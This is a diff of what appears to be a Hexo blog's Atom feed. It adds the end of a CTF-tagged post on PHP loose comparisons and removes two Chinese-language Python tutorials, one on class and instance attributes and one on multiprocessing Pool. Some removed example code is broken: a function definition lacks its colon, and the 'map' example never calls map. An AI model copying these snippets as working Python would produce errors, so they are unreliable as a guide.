class=&quot;number&quot;&gt;0&lt;/span&gt;] == [&lt;span class=&quot;keyword&quot;&gt;NULL&lt;/span&gt;] == [&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;NULL&lt;/span&gt; == &lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+  </entry>
   
   <entry>
     <title>string标准库源码学习</title>
@@ -1834,195 +1932,6 @@ item_info = ceshi[&apos;item_info&apos;]#建名为item_info的集合（表），
     
     
       <category term="python3 数据库" scheme="http://yoursite.com/tags/python3-%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>python类的学习</title>
-    <link href="http://yoursite.com/2016/10/05/python%E7%B1%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
-    <id>http://yoursite.com/2016/10/05/python类的学习/</id>
-    <published>2016-10-05T04:39:15.000Z</published>
-    <updated>2016-10-05T05:09:09.927Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="http://p1.bpimg.com/567571/370befa1102c08bc.png" alt=""></p>
-<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h2><p>   正如”类”的名称一样，它描述的概念和我们现实生活中的类的概念很相似。生物有不同的种类，食物有不同的种类，人类社会有种种商品也有不同的种类。单反可被称之为一类的物体，他们都有着相似的特征和行为方式。</p>
-<p>也就是说：</p>
-<pre><code>类是有一些系列有共同特征和行为事物的抽象概念的综合
-</code></pre><a id="more"></a>
-<h2 id="1-类的属性，实例属性，方法，引用"><a href="#1-类的属性，实例属性，方法，引用" class="headerlink" title="1 类的属性，实例属性，方法，引用"></a>1 类的属性，实例属性，方法，引用</h2><pre><code>class CocaCola:
-    #在类里面赋值的变量就是类的变量，类的变量有一个专业术语，称之为类的属性
-    formula = [&quot;caffeine&quot;,&quot;sugar&quot;,&quot;water&quot;,&quot;soda&quot;]
-    #方法就是函数，但我们把这个函数称之为方法。方法是供实例使用的，因此我们还可以称之为实例方法
-    #被实例化的对象会被编辑器默默地传入后面的方法括号中，作为第一个参数
-    &quot;&quot;&quot;
-    #除了必写的self参数之外，__init__()同样可以有自己的参数，同时不需要这样obj.__init__()方法来调用（因为是自动执行）
-    #在实例化的时候往类后面括号中放入参数，相应的所有参数都会传递到这个特殊的__init__()方法中，和函数的参数用法完全相同
-    def __init__(self,logo_name):
-        #左边的变量作为类的属性，右边是传入的这个参数作为变量，也就是说这个变量的赋值所储存的结果取决于初始化的时候所传进来的参数logo_name,传进来什么那么它就将是什么
-        self.local_logo = logo_name
-    def drink(self):
-        print (&quot;Energy&quot;)
-coke = CocaCola(&quot;可口可乐&quot;)
-#coke.drink()
-coke.local_logo
-&quot;&quot;&quot;
-    #和函数一样，类的方法也能有属于自己的函数，我们先试着在.drink()方法上做些改动
-    def drink(self,how_much):
-        if how_much == &quot;a sip&quot;:
-            print(&quot;Cool~&quot;)
-        elif how_much == &quot;whole bottle&quot;:
-            print (&quot;Headache!&quot;)
-ice_coke = CocaCola()
-ice_coke.drink(&quot;a sip&quot;)
-
-#类的实例化  按着我们定义好的配方来生产可乐，当然，按照这个配方无论生产多少瓶可乐它们的味道都是一样的
-#在左边创建一个变量，右边写上类的名称，看起来很像是赋值的行为，我们称之为类的实例化，而被实例化的对象称之为实例。
-coke_for_me = CocaCola()
-coke_for_you = CocaCola()
-
-coke_for_China = CocaCola()
-#在创建了类之后，通过object.new_attr的形式进行创建一个赋值，于是我们就可以得到一个新的实例的变量，实例的变量称之为实例属性
-coke_for_China.local_logo = &quot;可口可乐0&quot; #创建实例属性
-print (coke_for_China.local_logo )  #打印实例属性引用结果
-#在类的名字后面输入.,IDE就会自动联想出我们之前在定义类的时候写在里面的属性，而这就是类属性的引用
-#类的属性会被所有的类的实例共享
-print(CocaCola.formula)
-print(coke_for_me.formula)
-print(coke_for_you.formula)
-for element in coke_for_me.formula:
-    print(element)
-
-
-
-&quot;&quot;&quot;
-__init__()是initialize(初始化)的缩写，这也就意味着即使我们在创建实例的时候不去引用init_()方法，其中的命令也会先被自动的执行
-
-&quot;&quot;&quot;
-</code></pre><h2 id="2-令人困惑的类属性与实例属性"><a href="#2-令人困惑的类属性与实例属性" class="headerlink" title="2 令人困惑的类属性与实例属性"></a>2 令人困惑的类属性与实例属性</h2><p><img src="http://p1.bpimg.com/567571/768b9fe9a95a0f6a.png" alt=""></p>
-<pre><code>&quot;&quot;&quot;
-python中属性的引用机制是自外而内的，当创建一个实例之后，准备开始引用属性，这时编辑器会先搜索该实例是否用拥有该属性，有则引用
-如果没有，将搜索这个实例所属的类是否有这个尚需经，如果有，则引用，没有就只能报错
-&quot;&quot;&quot;
-
-#类属性若被重新赋值，会影响到类属性的引用
-class TestA:
-    attr = 1
-obj_a = TestA()
-
-TestA.attr = 42
-print(obj_a.attr)
-#实例属性若被重新赋值，不会影响到类属性的引用
-class TestB:
-    attr =1
-obj_a = TestA()
-obj_b = TestB()
-
-obj_a.attr = 42  #实例属性
-print(obj_b.attr)
-#类属性实例属性具有相同的名称，那么.后面引用将会发生什么?
-class TestC:
-    attr = 1
-    def __init__(self):
-        self.attr = 42
-print(obj_b.attr)
-print(TestC.__dict__)
-print(obj_a.__dict__)
-</code></pre><p>运行结果：</p>
-<pre><code>C:\python35\python3.exe G:/untitled/LeiShuxing.py
-42
-1
-1
-{&apos;attr&apos;: 1, &apos;__dict__&apos;: &lt;attribute &apos;__dict__&apos; of &apos;TestC&apos; objects&gt;, &apos;__init__&apos;: &lt;function TestC.__init__ at 0x000001CBBA8DBAE8&gt;, &apos;__module__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None, &apos;__weakref__&apos;: &lt;attribute &apos;__weakref__&apos; of &apos;TestC&apos; objects&gt;}
-{&apos;attr&apos;: 42}
-</code></pre><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>也许运行完上面三段代码，会有一些初步结论，但为更直接的解释，全部隐藏在类的特殊属性<strong>dict</strong>中。<strong>dict</strong>是一个类的特殊属性，它是一个字典，用于储存类或者实例的属性。即使你不去定义它，他也会存在每一个类中，是默认隐藏的。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;img src=&quot;http://p1.bpimg.com/567571/370befa1102c08bc.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;h2 id=&quot;0-前言&quot;&gt;&lt;a href=&quot;#0-前言&quot; class=&quot;headerlink&quot; title=&quot;0 前言&quot;&gt;&lt;/a&gt;0 前言&lt;/h2&gt;&lt;p&gt;   正如”类”的名称一样，它描述的概念和我们现实生活中的类的概念很相似。生物有不同的种类，食物有不同的种类，人类社会有种种商品也有不同的种类。单反可被称之为一类的物体，他们都有着相似的特征和行为方式。&lt;/p&gt;
-&lt;p&gt;也就是说：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;类是有一些系列有共同特征和行为事物的抽象概念的综合
-&lt;/code&gt;&lt;/pre&gt;
-    
-    </summary>
-    
-    
-      <category term="python3" scheme="http://yoursite.com/tags/python3/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>pool线程池的使用</title>
-    <link href="http://yoursite.com/2016/09/25/pool%E7%BA%BF%E7%A8%8B%E6%B1%A0%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
-    <id>http://yoursite.com/2016/09/25/pool线程池的使用/</id>
-    <published>2016-09-25T04:53:38.000Z</published>
-    <updated>2016-10-04T16:37:30.605Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="1-线程池的原理和使用"><a href="#1-线程池的原理和使用" class="headerlink" title="1 线程池的原理和使用"></a>1 线程池的原理和使用</h3><p>问题的提出：</p>
-<blockquote>
-<p>在使用多线程的时候面对着一个问题，如果使用断点下载，把每个range设置为指定值，文件大或者range小都会面对一个任务数爆炸的状态。使用一个线程来完成一个任务会造成线程数过多，线程数过多不仅影响效率，也会影响程序的健壮性<br><a id="more"></a></p>
-<h3 id="2-线程池的原理"><a href="#2-线程池的原理" class="headerlink" title="2 线程池的原理"></a>2 线程池的原理</h3><pre><code>1.线程池首先会维护一个任务队列
-2.生成工作使用的线程(可以是自定义个数，也可以是系统默认)
-3.线程分别从队列中取出任务，并执行，一个任务执行完成需要告诉主线程完成一个任务
-4.再从任务队列中取出任务，直到所有任务为空，退出线程
-</code></pre><h3 id="3-具体使用"><a href="#3-具体使用" class="headerlink" title="3 具体使用"></a>3 具体使用</h3><h5 id="A-新建单一进程"><a href="#A-新建单一进程" class="headerlink" title="A 新建单一进程"></a>A 新建单一进程</h5><pre><code>import multiprocessing
-import time
-</code></pre></blockquote>
-<pre><code>def func(msg):
-    print(msg)
-    time.sleep(1)
-
-if __name__ == &quot;__main__&quot;:
-     #将函数作为第一个参数传入Process中，注意函数不能是类里面的函数，只能是独立定义的
-       #把args参数作为第二个参数传入Process中，注意下面例子中的args=(&quot;hello &quot;, )是打包成了元组类型，可迭代，但是里面只有一个元素
-    #func(&quot;Josn&quot;)
-    p = multiprocessing.Process(target = func,args = (&quot;hello &quot;,))
-    p.start()
-    p.join()
-    print(&quot;Done!&quot;)
-</code></pre><h4 id="B-使用进程池"><a href="#B-使用进程池" class="headerlink" title="B 使用进程池"></a>B 使用进程池</h4><pre><code>import multiprocessing
-import time
-
-def func(msg):
-    print(msg)
-    time.sleep(1)
-if __name__ == &quot;__main__&quot;:
-    pool = multiprocessing.Pool()
-    for item in range(3):
-        msg = &quot;hello &quot; + str(item)
-        pool.apply_async(func, (msg,))
-    pool.close()
-    pool.join()#用来等待进程池中的worker进程完毕，防止主进程在worker进程结束前结束，但pool.join()必须在pool.close()之后
-    print(&quot;Done!&quot;)
-</code></pre><p>使用  pool.apply_async（）的道理和pool.map()一样，注意的是第二个参数一定是可以迭代的，即函数一个个传进去对应着前面的函数，利用pool.map()创建工程如下</p>
-<h4 id="C-利用map函数修改"><a href="#C-利用map函数修改" class="headerlink" title="C 利用map函数修改"></a>C 利用map函数修改</h4><pre><code>import multiprocessing
-import time
-
-def func(msg)
-    print(msg)
-    time.sleep(2)
-if __name__ == &quot;__main__&quot;:
-    pool = multiprocessing.Pool()
-    msg_list = []
-    for item in range(4):
-        msg_list.append(&quot;hello &quot; + str(item))
-    pool.close()
-    pool.join()
-    print(&quot;Done!&quot;)
-</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>学会利用pycharm的debug功能下断点，充分领会代码的运行机制<br><img src="http://p1.bpimg.com/567571/eacff7552370ad72.png" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;1-线程池的原理和使用&quot;&gt;&lt;a href=&quot;#1-线程池的原理和使用&quot; class=&quot;headerlink&quot; title=&quot;1 线程池的原理和使用&quot;&gt;&lt;/a&gt;1 线程池的原理和使用&lt;/h3&gt;&lt;p&gt;问题的提出：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;在使用多线程的时候面对着一个问题，如果使用断点下载，把每个range设置为指定值，文件大或者range小都会面对一个任务数爆炸的状态。使用一个线程来完成一个任务会造成线程数过多，线程数过多不仅影响效率，也会影响程序的健壮性&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="python3" scheme="http://yoursite.com/tags/python3/"/>
     
   </entry>
   
